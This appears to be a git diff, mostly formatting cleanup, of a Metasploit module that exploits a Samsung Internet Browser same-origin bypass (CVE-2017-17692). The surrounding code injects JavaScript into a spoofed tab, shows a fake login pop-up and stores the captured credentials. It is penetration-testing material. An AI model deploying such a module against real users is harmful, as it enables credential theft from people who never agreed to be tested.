@@ -10,31 +10,36 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'           => 'Samsung Internet Browser SOP Bypass',
-        'Description'    => %q(
+        'Name' => 'Samsung Internet Browser SOP Bypass',
+        'Description' => %q{
           This module takes advantage of a Same-Origin Policy (SOP) bypass vulnerability in the
           Samsung Internet Browser, a popular mobile browser shipping with Samsung Android devices.
           By default, it initiates a redirect to a child tab, and rewrites the innerHTML to gather
           credentials via a fake pop-up.
-        ),
-        'License'        => MSF_LICENSE,
-        'Author'         => [
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Dhiraj Mishra', # Original discovery, disclosure
           'Tod Beardsley', # Metasploit module
           'Jeffrey Martin' # Metasploit module
         ],
-        'References'     => [
-        [ 'CVE', '2017-17692' ],
-        ['URL', 'http://fr.0day.today/exploit/description/28434']
+        'References' => [
+          [ 'CVE', '2017-17692' ],
+          ['URL', 'http://fr.0day.today/exploit/description/28434']
         ],
         'DisclosureDate' => '2017-11-08',
-        'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
+        'Actions' => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
         'PassiveActions' => [ 'WebServer' ],
-        'DefaultAction'  => 'WebServer'
+        'DefaultAction' => 'WebServer',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
       )
     )
 
-  register_options([
+    register_options([
       OptString.new('TARGET_URL', [
         true,
         'The URL to spoof origin from.',
@@ -47,14 +52,13 @@ class MetasploitModule < Msf::Auxiliary
       ])
     ])
 
-  register_advanced_options([
-    OptString.new('CUSTOM_JS', [
-      false,
-      "Custom Javascript to inject as the go() function. Use the variable 'x' to refer to the new tab.",
-      ''
+    register_advanced_options([
+      OptString.new('CUSTOM_JS', [
+        false,
+        "Custom Javascript to inject as the go() function. Use the variable 'x' to refer to the new tab.",
+        ''
+      ])
     ])
-  ])
-
   end
 
   def run
@@ -63,6 +67,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def evil_javascript
     return datastore['CUSTOM_JS'] unless datastore['CUSTOM_JS'].blank?
+
     js = <<-EOS
       setTimeout(function(){
         x.document.body.innerHTML='<h1>404 Error</h1>'+
@@ -95,10 +100,10 @@ class MetasploitModule < Msf::Auxiliary
         <body onclick="go()">
         #{datastore['CUSTOM_HTML']}
         </body></html>
-      EOS
+    EOS
   end
 
-  def store_cred(username,password)
+  def store_cred(username, password)
     credential_data = {
       origin_type: :import,
       module_fullname: self.fullname,
@@ -124,7 +129,7 @@ class MetasploitModule < Msf::Auxiliary
       print_good("#{cli.peerhost}: POST data received from #{datastore['TARGET_URL']}: #{request.body}")
     else
       print_good("#{cli.peerhost}: Collected credential for '#{datastore['TARGET_URL']}' #{u}:#{p}")
-      store_cred(u,p)
+      store_cred(u, p)
     end
   end
 
